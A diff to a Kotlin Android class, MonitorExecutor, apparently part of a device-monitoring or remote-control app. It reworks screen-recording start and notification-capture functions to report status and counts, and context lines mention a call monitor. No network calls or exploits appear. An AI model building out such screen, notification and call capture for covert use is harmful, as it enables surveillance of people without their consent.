@@ -202,9 +202,26 @@ object MonitorExecutor {
     }
 
     // ===== SCREEN RECORD =====
-    fun screenRecordStart(): String {
+    fun screenRecordStart(context: Context, params: Map<String, Any> = emptyMap()): Map<String, Any> {
         screenRecordingActive = true
-        return "Screen recording started - use ControlExecutor.recordScreen() for actual recording"
+        Log.i(TAG, "Screen recording flag set. Screen recording requires MediaProjection permission.")
+        // Attempt to delegate to ControlExecutor for actual recording
+        return try {
+            val result = ControlExecutor.startScreenRecording(context, params)
+            mapOf(
+                "monitor_flag" to true,
+                "message" to "Screen recording started - delegated to ControlExecutor",
+                "recording_result" to result
+            )
+        } catch (e: Exception) {
+            Log.w(TAG, "ControlExecutor screen recording failed: ${e.message}")
+            mapOf(
+                "monitor_flag" to true,
+                "message" to "Screen recording monitor activated. Use ControlExecutor.recordScreen() for actual MediaProjection-based recording.",
+                "hint" to "Ensure screen capture permission has been granted via ScreenCaptureService.",
+                "recording_result" to "delegation_failed"
+            )
+        }
     }
 
     fun screenRecordStop(): String {
@@ -899,14 +916,30 @@ object MonitorExecutor {
     fun isCallMonitorActive(): Boolean = callMonitorActive
 
     // ===== NOTIFICATION MONITOR =====
-    fun notificationMonitorStart(): String {
+    fun notificationMonitorStart(): Map<String, Any> {
         notificationMonitorActive = true
-        return "Notification monitoring started - requires NotificationListenerService"
+        val listenerService = com.abuzahra.manager.service.MyNotificationListenerService.getInstance()
+        val isConnected = listenerService != null
+        val status = if (isConnected) {
+            "Notification monitoring started - NotificationListenerService is connected"
+        } else {
+            "Notification monitoring started - NotificationListenerService NOT connected. Ensure it is enabled in Settings > Notification Access."
+        }
+        return mapOf(
+            "active" to true,
+            "service_connected" to isConnected,
+            "history_count" to notificationHistory.size,
+            "message" to status
+        )
     }
-    
-    fun notificationMonitorStop(): String {
+
+    fun notificationMonitorStop(): Map<String, Any> {
         notificationMonitorActive = false
-        return "Notification monitoring stopped"
+        return mapOf(
+            "active" to false,
+            "history_count" to notificationHistory.size,
+            "message" to "Notification monitoring stopped. ${notificationHistory.size} notifications captured during session."
+        )
     }
     
     fun addNotification(packageName: String, title: String?, text: String?, category: String?) {
